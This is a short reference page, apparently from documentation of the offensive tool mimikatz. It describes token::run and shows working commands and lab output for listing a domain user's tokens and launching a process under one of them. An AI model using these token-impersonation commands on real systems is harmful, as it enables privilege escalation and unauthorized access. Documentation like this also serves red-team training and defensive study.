# run

`token::run` executes a process with its token.

It has the following command line argument:

* `/id`: Token id to use for the new process
* `/user`: Execute the process with the tokens of this user (instead of specifying the token ID)..
* `/process`: The process to run. By default, the command `whoami` is executed.

## Use Primary Token in new Process

List tokens of user to impersonate:

```
mimikatz # token::list /user:ffast
Token Id  : 0
User name : ffast
SID name  :
 
5332    {0;000563b2} 2 F 457263         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
4432    {0;000563b2} 2 F 2839551        winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
668     {0;00050574} 0 D 329079         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (12g,24p)       Impersonation (Impersonation)
668     {0;000563e4} 2 L 353269         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
800     {0;000563e4} 2 L 456098         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
920     {0;000563e4} 2 L 380750         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
920     {0;000563e4} 2 L 387116         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,01p)       Impersonation (Identification)
920     {0;000563e4} 2 L 436160         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
[...]
```

Run a command using a specified token by it's token ID. By default, the command `whoami` is executed:

```
mimikatz # token::run /id:457263
Token Id  : 457263
User name :
SID name  :

676     {0;000f0ac5} 3 F 457263         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
winattacklab\ffast
```
